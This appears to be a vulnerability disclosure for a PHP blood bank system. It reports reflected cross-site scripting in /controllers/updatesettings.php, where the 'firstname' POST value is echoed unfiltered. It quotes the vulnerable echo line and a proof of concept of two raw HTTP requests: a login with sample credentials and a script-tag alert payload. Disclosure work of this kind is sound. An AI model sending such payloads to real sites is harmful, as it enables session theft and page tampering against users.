# blood-bank-system-in-php has Cross Site Scripting vulnerability in /controllers/updatesettings.php

## supplier 
https://code-projects.org/blood-bank-system-in-php-with-source-code

## Vulnerability file

/controllers/updatesettings.php

## describe

The /controllers/updatesettings. php file in this system retrieves the parameter 'firstname' and echo it, creating a cross site scripting vulnerability

**Code analysis**    

echo firstname value in no filter in /controllers/updatesettings.php

```
echo $_POST['firstname'];
```

![image-20241129001254081](https://github.com/user-attachments/assets/ffc7d21b-107c-47a3-b2e6-51a0e9da20d8)

## POC

login into the system

```
POST /controllers/logincontrol.php HTTP/1.1
Host: collegeproject-wazifa
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://collegeproject-wazifa
Connection: close
Referer: http://collegeproject-wazifa/login.php
Cookie: PHPSESSID=3kospkmbqtu3riei9610culh61
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=ahmed&password=12345
```

Trigger cross site scripting vulnerability to execute alert statement

```
POST /controllers/updatesettings.php/ HTTP/1.1
Host: collegeproject-wazifa
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 58
Origin: http://collegeproject-wazifa
Connection: close
Referer: http://collegeproject-wazifa/controllers/updatesettings.php/
Cookie: PHPSESSID=3kospkmbqtu3riei9610culh61
Upgrade-Insecure-Requests: 1
Priority: u=0, i

firstname=%3Cscript%3Ealert%281111111%29%3B%3C%2Fscript%3E
```

**Result**

![image-20241129001232943](https://github.com/user-attachments/assets/eff8d0c0-3be7-43c1-85c8-4d1e17c7b546)